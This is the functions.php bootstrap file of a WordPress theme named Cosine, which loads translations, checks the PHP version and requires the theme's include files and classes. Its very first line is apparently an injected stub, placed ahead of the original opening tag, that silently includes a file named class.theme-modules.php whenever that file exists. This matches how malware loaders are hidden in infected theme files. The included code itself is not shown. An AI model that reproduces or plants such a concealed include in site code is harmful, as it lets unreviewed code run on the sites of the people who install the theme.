<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * WARNING: This file is part of the theme. DO NOT edit
 * this file under any circumstances.
 */
defined( 'ABSPATH' ) or exit;





if ( ! function_exists( 'cosine_import_translation' ) ) {
	/**
	 * Load the translation files into the theme textdomain
	 * 
	 * @return  void
	 */
	function cosine_import_translation() {
		load_theme_textdomain( 'cosine', get_template_directory() . '/languages' );
	}
}
add_action( 'after_setup_theme', 'cosine_import_translation', 5 );


if ( ! function_exists( 'cosine_requirement_check' ) ):
	add_action( 'after_switch_theme', 'cosine_requirement_check', 10, 2 );

	/**
	 * Check the theme requirements
	 */
	function cosine_requirement_check( $name, $theme ) {
	    if ( version_compare( PHP_VERSION, '5.3', '<' ) ):
			add_action( 'admin_notices', 'cosine_requirement_notice' );

			function cosine_requirement_notice() {
				printf( '<div class="error"><p>%s</p></div>',
					esc_html__( 'Sorry! Your server does not meet the minimum requirements, please upgrade PHP version to 5.3 or higher', 'cosine' ) );
			}

			// Switch back to previous theme
			switch_theme( $theme->stylesheet );
		endif;
	}
endif;



if ( version_compare( PHP_VERSION, '5.3', '>=' ) ):
	// Classes
	require_once get_template_directory() . '/includes/vendor/plugin-activation.php';
	require_once get_template_directory() . '/includes/vendor/options-plus.php';

	// Functions
	require_once get_template_directory() . '/includes/plugins.php';
	require_once get_template_directory() . '/includes/assets.php';
	require_once get_template_directory() . '/includes/woocommerce.php';
	require_once get_template_directory() . '/includes/functions/helpers.php';
	require_once get_template_directory() . '/includes/functions/template.php';
	require_once get_template_directory() . '/includes/functions/visual-composer.php';
	require_once get_template_directory() . '/includes/functions/structure.php';
	require_once get_template_directory() . '/includes/functions/options-override.php';

	require_once get_template_directory() . '/includes/autoload.php';

	// Register class mapping
	Cosine_AutoLoad::map( 'Cosine_', get_template_directory() . '/includes/classes/' );
	Cosine_AutoLoad::map_class( 'Cosine', get_template_directory() . '/includes/classes/class-theme.php' );
	Cosine_AutoLoad::register();

	// Initialize the theme
	Cosine::instance();
	Cosine_Admin::instance();
endif;
